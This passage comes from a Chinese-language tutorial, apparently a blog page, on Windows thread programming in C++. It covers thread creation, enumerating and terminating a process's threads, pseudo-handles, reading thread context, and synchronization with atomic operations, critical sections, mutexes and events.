class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (n&lt;<span class="number">100000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n);</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 创建线程</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)<span class="string">&quot;15PB&quot;</span>,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="comment">//2 等到线程结束</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(</span><br><span class="line">hThread,</span><br><span class="line"><span class="number">-1</span>      <span class="comment">//一直等到有信号的状态</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程遍历"><a href="#线程遍历" class="headerlink" title="线程遍历"></a>线程遍历</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">VOID <span class="title">ListProcessThreads</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;</span><br><span class="line">THREADENTRY32 te32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建快照</span></span><br><span class="line">hThreadSnap =               <span class="comment">//参数一为一个线程的宏，遍历进程就写进程的宏，模块就写模块的宏</span></span><br><span class="line"><span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 设置输入参数，结构的大小</span></span><br><span class="line">te32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line"><span class="comment">// 开始获取信息</span></span><br><span class="line"><span class="built_in">Thread32First</span>(hThreadSnap, &amp;te32);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程ID:%d\n&quot;</span>, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//1. 打开线程，得到句柄</span></span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//2. 暂停</span></span><br><span class="line"><span class="comment">//SuspendThread(hThread);</span></span><br><span class="line"><span class="comment">//ResumeThread(hThread);</span></span><br><span class="line"><span class="built_in">TerminateThread</span>(hThread, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示相关信息</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te32));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">ListProcessThreads</span>(<span class="number">4068</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="理解伪句柄"><a href="#理解伪句柄" class="headerlink" title="理解伪句柄"></a>理解伪句柄</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 得到句柄</span></span><br><span class="line">HANDLE hThread = (HANDLE)lpThreadParameter;</span><br><span class="line"><span class="comment">//2 获取创建时间</span></span><br><span class="line">FILETIME stcCreationTime, stcExitTime;</span><br><span class="line">FILETIME stcKernelTime, stcUserTime;</span><br><span class="line"><span class="built_in">GetThreadTimes</span>(hThread, &amp;stcCreationTime,</span><br><span class="line">&amp;stcExitTime, &amp;stcKernelTime, &amp;stcUserTime);</span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line"><span class="built_in">FileTimeToLocalFileTime</span>(&amp;stcCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line"><span class="built_in">FileTimeToSystemTime</span>(&amp;fi, &amp;st);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取当前线程句柄</span></span><br><span class="line">HANDLE hThread = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">HANDLE hProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line"><span class="comment">//2 获取当前线程的创建时间</span></span><br><span class="line">FILETIME stcCreationTime, stcExitTime;</span><br><span class="line">FILETIME stcKernelTime, stcUserTime;</span><br><span class="line"><span class="built_in">GetThreadTimes</span>(hThread, &amp;stcCreationTime,</span><br><span class="line">&amp;stcExitTime, &amp;stcKernelTime, &amp;stcUserTime);</span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line"><span class="built_in">FileTimeToLocalFileTime</span>(&amp;stcCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line"><span class="built_in">FileTimeToSystemTime</span>(&amp;fi, &amp;st);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">10000</span>);</span><br><span class="line"><span class="comment">//2.X 将伪句柄变成一个真句柄</span></span><br><span class="line">HANDLE hThreadParent = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">DuplicateHandle</span>(</span><br><span class="line"><span class="built_in">GetCurrentProcess</span>(), <span class="comment">// 拥有源句柄的进程句柄</span></span><br><span class="line"><span class="built_in">GetCurrentThread</span>(),  <span class="comment">// 指定对象的现有句柄(伪句柄)</span></span><br><span class="line"><span class="built_in">GetCurrentProcess</span>(), <span class="comment">// 拥有新对象句柄的进程句柄</span></span><br><span class="line">&amp;hThreadParent,      <span class="comment">// 用于保存新句柄</span></span><br><span class="line"><span class="number">0</span>,                   <span class="comment">// 安全访问级别</span></span><br><span class="line"><span class="literal">false</span>,               <span class="comment">// 是否可以被子进程继承</span></span><br><span class="line">DUPLICATE_SAME_ACCESS); <span class="comment">// 转换选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3 创建一个子线程</span></span><br><span class="line">HANDLE hChildThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)hThreadParent,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hChildThread, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hChildThread); <span class="comment">//关闭句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadParent);<span class="comment">//关闭句柄</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取线程环境"><a href="#获取线程环境" class="headerlink" title="获取线程环境"></a>获取线程环境</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">VOID <span class="title">ListProcessThreads</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;</span><br><span class="line">THREADENTRY32 te32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建快照</span></span><br><span class="line">hThreadSnap =</span><br><span class="line"><span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 设置输入参数，结构的大小</span></span><br><span class="line">te32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line"><span class="comment">// 开始获取信息</span></span><br><span class="line"><span class="built_in">Thread32First</span>(hThreadSnap, &amp;te32);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程ID:%d\n&quot;</span>, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//1. 打开线程，得到句柄</span></span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//2. 暂停</span></span><br><span class="line"><span class="comment">//SuspendThread(hThread);</span></span><br><span class="line"><span class="comment">//3. 获取上下文</span></span><br><span class="line">CONTEXT context = &#123; CONTEXT_ALL &#125;;</span><br><span class="line"><span class="built_in">GetThreadContext</span>(hThread, &amp;context); </span><br><span class="line"><span class="comment">//context.;</span></span><br><span class="line"><span class="comment">//SetThreadContext(hThread, &amp;context); //获取之后，可以修改</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line"><span class="comment">//TerminateThread(hThread, 0);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示相关信息</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te32));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">ListProcessThreads</span>(<span class="number">25088</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>1 线程同步是一个什么样的问题？？？</p><p>如果你编写的是多线程程序，那么多个线程是并发执行，可以认为他们是同时在执行代码。但是线程和线程之间并非是完全的没有关系。很多时候会有以下两种关系：</p><p>第一种情况，线程A的继续执行，要以线程B完成了某一个操作之后为前提。 这种需求称之为同步</p><p>第二种情况，多个线程在争抢一个资源，比如：全局变量，可以是文件，可以是一个数据结构，可以是一个对象。 这种需求称之为同步互斥。</p><p>2 以下的这些机制怎么解决的这个问题？？各自又什么区别，分别用于什么样的场景呢？？？</p><p>a. 以下这些机制都能够比较方便的解决互斥问题。</p><h4 id="原子操作："><a href="#原子操作：" class="headerlink" title="原子操作："></a>原子操作：</h4><p> 原子操作适合去解决共享资源是全局变量的互斥问题。</p><p> 作用就是对于一个变量的基本算术运算保证是原子性的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">long</span> g_n = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">InterlockedIncrement</span>(&amp;g_n);</span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">InterlockedIncrement</span>(&amp;g_n);</span><br><span class="line"><span class="comment">//读取文件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="临界区解决互斥问题："><a href="#临界区解决互斥问题：" class="headerlink" title="临界区解决互斥问题："></a>临界区解决互斥问题：</h4><p> 被保护的代码（代码访问了共享资源）放置在</p><p> EnterCriticalSection</p><p> LeaveCriticalSection 之间即可</p><p> 临界区具有线程所有权这个概念，必须进入临界区的线程，调用离开临界区，临界区才会被打开。假如加锁的线程崩溃了，其他线程就锁死了。</p><p>介绍另外3种机制前，先说两个重要概念</p><p>1：</p><p>激发态（有信号） 非激发态（没有信号）</p><p>WaitForSignaleObject(内核对象，时间)；函数的作用，当内核对象处于非激发态的时候，就阻塞住，内核对象处于激发态了，就立即返回。</p><p>2：WaitForSignaleObject的副作用，WaitForSignaleObject对于被等待的内核对象有副作用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//定义临界区结构体</span></span><br><span class="line">CRITICAL_SECTION g_cs = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始化临界区对象</span></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;g_cs);</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知道了以上两个概念后，我们看其他3个机制</p><h4 id="互斥体解决互斥问题："><a href="#互斥体解决互斥问题：" class="headerlink" title="互斥体解决互斥问题："></a>互斥体解决互斥问题：</h4><p> 被保护的代码（代码访问了共享资源）放置在</p><p> WaitForSignalObject</p><p> ReleaseMutex</p><p> 互斥体也具有线程所有权的概念，得到互斥体的线程，需要自己去释放互斥体。谁加锁，谁开锁。如果得到互斥体的线程崩溃了，互斥体会立即变为激发态。所有等待互斥体的线程中会立即有线程得到互斥体。不会造成死锁的问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hMutex = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hMutex, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(g_hMutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hMutex, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(g_hMutex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hMutex = <span class="built_in">CreateMutex</span>(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,<span class="comment">//创建的线程，是不是第一个拥有者</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="事件解决互斥问题："><a href="#事件解决互斥问题：" class="headerlink" title="事件解决互斥问题："></a>事件解决互斥问题：</h4><p>需要是自动模式的事件</p><p> 被保护的代码（代码访问了共享资源）放置在</p><p> WaitForSignalObject</p><p> SetEvent</p><p> 事件，没有线程所有权的概念，任何线程都可以释放事件。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 